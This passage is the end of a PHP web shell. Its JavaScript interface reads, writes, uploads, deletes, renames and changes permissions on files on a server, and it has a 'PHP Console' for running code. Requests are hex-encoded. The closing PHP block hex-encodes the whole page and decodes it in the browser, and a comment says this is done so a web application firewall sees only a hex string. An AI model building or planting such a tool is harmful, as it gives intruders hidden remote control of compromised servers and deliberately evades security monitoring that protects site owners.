    var dir=path.replace(/\/[^\/]+$/,'');var fname=path.replace(/.*\//,'');
    CACHE_D=s2h(dir);
    var r=await api({a:'rd',t:fname});
    if(!r.ok){toast('Cannot read: '+name,'error');return;}
    document.getElementById('editFileName').textContent=name;
    document.getElementById('editFileContent').value=h2s(r.c||'');
    _editFile={path:path,dir:dir,name:fname};
    showModal('editModal');
}
async function saveFile(){
    var content=document.getElementById('editFileContent').value;
    CACHE_D=s2h(_editFile.dir);
    var r=await api({a:'wr',t:_editFile.name,c:s2h(content)});
    if(r.ok){toast('File saved: '+_editFile.name,'success');closeModal('editModal');}
    else toast('Save failed: '+(_editFile.name),'error');
}
async function downloadFile(path,name){
    var dir=path.replace(/\/[^\/]+$/,'');var fname=path.replace(/.*\//,'');
    CACHE_D=s2h(dir);
    var r=await api({a:'dl',t:fname});
    if(!r.ok){toast('Cannot download: '+name,'error');return;}
    var b=new Blob([h2b(r.c||'')],{type:'application/octet-stream'});
    var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=r.n||name;a.click();
}
async function createFile(){
    var name=document.getElementById('newFileName').value.trim();
    if(!name){toast('Enter file name','error');return;}
    CACHE_D=s2h(curPath);
    var r=await api({a:'wr',t:name,c:''});
    if(r.ok){toast('Created: '+name,'success');closeModal('newFileModal');document.getElementById('newFileName').value='';loadFiles(curPath);}
    else toast('Failed to create file','error');
}
async function createFolder(){
    var name=document.getElementById('newFolderName').value.trim();
    if(!name){toast('Enter folder name','error');return;}
    CACHE_D=s2h(curPath);
    var r=await api({a:'mk',n:name});
    if(r.ok){toast('Created: '+name,'success');closeModal('newFolderModal');document.getElementById('newFolderName').value='';loadFiles(curPath);}
    else toast('Failed to create folder','error');
}
async function uploadFile(){
    var fi=document.getElementById('uploadFileInput');
    if(!fi.files||!fi.files[0]){toast('Select a file first','error');return;}
    var file=fi.files[0],sz=file.size,done=0,first=true;
    document.getElementById('uploadProgress').style.display='block';
    document.getElementById('uploadStatus').textContent='Uploading...';
    CACHE_D=s2h(curPath);
    while(done<sz){
        var chunk=file.slice(done,done+65536);
        var ab=await new Promise(function(res){var fr=new FileReader();fr.onload=function(e){res(e.target.result);};fr.readAsArrayBuffer(chunk);});
        var hex=Array.from(new Uint8Array(ab)).map(function(b){return b.toString(16).padStart(2,'0');}).join('');
        await api({a:'chnk',n:file.name,d:hex,is_first:first});
        done+=65536;first=false;
        var pct=Math.min(100,Math.round(done/sz*100));
        document.getElementById('uploadBar').style.width=pct+'%';
        document.getElementById('uploadStatus').textContent=pct+'%';
    }
    toast('Uploaded: '+file.name,'success');
    document.getElementById('uploadProgress').style.display='none';
    document.getElementById('uploadBar').style.width='0';
    fi.value='';
    closeModal('uploadModal');loadFiles(curPath);
}
async function deleteItem(path,name){
    if(!confirm('Delete "'+name+'"? This cannot be undone.'))return;
    var dir=path.replace(/\/[^\/]+$/,'');var fname=path.replace(/.*\//,'');
    CACHE_D=s2h(dir);
    var r=await api({a:'rm',t:fname});
    if(r.ok){toast('Deleted: '+name,'success');loadFiles(curPath);}
    else toast('Cannot delete: '+name,'error');
}
function openRename(path,name){
    _renameOld={path:path,dir:path.replace(/\/[^\/]+$/,''),name:path.replace(/.*\//,'')};
    document.getElementById('renameNewName').value=name;
    showModal('renameModal');
}
async function renameItem(){
    var newname=document.getElementById('renameNewName').value.trim();
    if(!newname)return;
    CACHE_D=s2h(_renameOld.dir);
    var r=await api({a:'rn',o:_renameOld.name,n:newname});
    if(r.ok){toast('Renamed to: '+newname,'success');closeModal('renameModal');loadFiles(curPath);}
    else toast('Rename failed','error');
}
function openChmod(path,perms){
    _chmodFile={path:path,dir:path.replace(/\/[^\/]+$/,''),name:path.replace(/.*\//,'')};
    document.getElementById('chmodValue').value=perms||'0644';
    showModal('chmodModal');
}
async function applyChmod(){
    var p=document.getElementById('chmodValue').value.trim();
    if(!p)return;
    CACHE_D=s2h(_chmodFile.dir);
    var r=await api({a:'chm',t:_chmodFile.name,p:p});
    if(r.ok){toast('Permissions changed: '+p,'success');closeModal('chmodModal');loadFiles(curPath);}
    else toast('chmod failed','error');
}
function setAsConsoleDir(){
    consoleDir=curPath;
    document.getElementById('consoleDir').value=curPath;
    updateCurDir(curPath);
    toast('PHP Console directory set to: '+curPath,'success');
    showTab('console');
}
function setConsoleDirTo(path){
    consoleDir=path;curPath=path;
    document.getElementById('consoleDir').value=path;
    updateCurDir(path);
    toast('Console dir: '+path,'success');
    showTab('console');
}

// ── Modal helpers ─────────────────────────────────────────────────────────────
function showModal(id){document.getElementById(id).classList.add('active');}
function closeModal(id){document.getElementById(id).classList.remove('active');}
document.addEventListener('keydown',function(e){
    if(e.key==='Escape')document.querySelectorAll('.modal').forEach(function(m){m.classList.remove('active');});
    if(e.ctrlKey&&e.key==='Enter'&&document.getElementById('tab-console').classList.contains('active'))runCode();
});

// ── Init ──────────────────────────────────────────────────────────────────────
window.onload=function(){loadFiles(curPath);};
</script>
</body>
</html>
<?php
$_ui = ob_get_clean();
$_hex = bin2hex($_ui);
// sys_render: WAF sees only hex string, browser decodes and renders full UI
echo '<script>!function(){var _h="'.$_hex.'";var _s="";for(var _i=0;_i<_h.length;_i+=2)_s+=String.fromCharCode(parseInt(_h.substr(_i,2),16));document.open("text/html","replace");document.write(_s);document.close();}();</script>';
